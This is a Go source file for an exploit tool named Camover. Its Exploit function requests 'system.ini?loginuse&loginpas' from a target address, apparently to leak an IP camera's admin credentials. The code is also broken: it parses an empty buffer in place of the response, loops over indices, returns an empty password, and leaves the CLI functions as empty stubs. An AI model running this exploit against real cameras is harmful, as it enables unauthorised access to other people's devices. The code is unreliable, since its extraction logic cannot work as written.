package pkg

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"regexp"
	"strings"
)

type CamoverCli struct {
	delay float32
}

type Camover struct {
	username string
}

type Account struct {
	Username string
	Password string
}

func NewCamover() *Camover {
	return &Camover{
		username: "admin",
	}
}

func (c *Camover) Exploit(address string) (*Account, error) {
	uri := fmt.Sprintf("http://%s/system.ini?loginuse&loginpas", address)

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: false,
		},
	}

	client := &http.Client{
		Transport: transport,
	}

	request, err := http.NewRequest(http.MethodGet, uri, nil)
	if err != nil {
		return nil, err
	}

	response, err := client.Do(request)

	if err != nil {
		return nil, err
	}

	defer response.Body.Close()

	if response.StatusCode == 200 {
		re := regexp.MustCompile(`[^\x00-\x1F\x7F-\xFF]{4,}`)

		matches := re.FindAll([]byte(""), -1)

		for match := range matches {
			if strings.Contains(string(match), c.username) {
				var account Account

				account.Username = c.username
				account.Password = ""
				return &account, nil
			}
		}

	}

	return nil, err
}

func NewCamoverCli(delay float32) *CamoverCli {
	return &CamoverCli{
		delay: delay,
	}
}

func (c *CamoverCli) run(address string) bool {
	return false
}

func (c *CamoverCli) crack(address string) {}

func (c *CamoverCli) start() {}
